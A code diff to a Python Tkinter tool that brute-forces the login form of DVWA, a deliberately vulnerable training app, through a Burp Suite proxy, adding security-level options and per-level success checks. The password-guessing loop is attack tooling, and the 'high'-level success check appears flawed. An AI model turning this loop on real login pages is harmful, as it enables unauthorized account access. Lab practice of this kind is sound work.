@@ -24,8 +24,8 @@ def change_security_level(security_level):
     response = requests.post(DVWA_SECURITY_URL, data=data, proxies=proxies)
 
     # Check if the security level change was successful
-    if f"Security level is now {security_level.upper()}" in response.text:
-        result_label.config(text=f"Security level changed to {security_level.upper()}")
+    if f"Security level is now {security_level.capitalize()}" in response.text:
+        result_label.config(text=f"Security level changed to {security_level.capitalize()}")
     else:
         result_label.config(text="Failed to change security level")
 
@@ -37,20 +37,26 @@ def perform_brute_force(username, password_list):
         'https': PROXY_URL
     }
 
-    # Iterate through the password list
-    for password in password_list:
-        # Prepare the data for the login request
+    # Send the login request to DVWA through Burp Suite proxy
+    def send_login_request(password):
         data = {
             'username': username,
             'password': password,
             'Login': 'Login'
         }
+        return requests.post(DVWA_LOGIN_URL, data=data, proxies=proxies)
 
-        # Send the login request to DVWA through Burp Suite proxy
-        response = requests.post(DVWA_LOGIN_URL, data=data, proxies=proxies)
+    # Get the selected security level
+    security_level = security_var.get()
 
-        # Check if the login was successful
-        if "Welcome to the password protected area" in response.text:
+    # Iterate through the password list
+    for password in password_list:
+        response = send_login_request(password)
+
+        # Check if the login was successful based on the security level
+        if (security_level == "low" and "Welcome to the password protected area" in response.text) or \
+           (security_level == "medium" and "Welcome to the password protected area" in response.text and "Impossible" not in response.text) or \
+           (security_level == "high" and "Impossible" not in response.text):
             result_label.config(text=f"Successful login! Password: {password}")
             return
 
@@ -81,7 +87,7 @@ security_label.grid(row=2, column=0, padx=10, pady=10)
 security_var = tk.StringVar(root)
 security_var.set("low")  # Default selection
 
-security_option = tk.OptionMenu(root, security_var, "low", "medium", "high")
+security_option = tk.OptionMenu(root, security_var, "low", "medium", "high", "impossible")
 security_option.grid(row=2, column=1, padx=10, pady=10)
 
 # Button to change security level
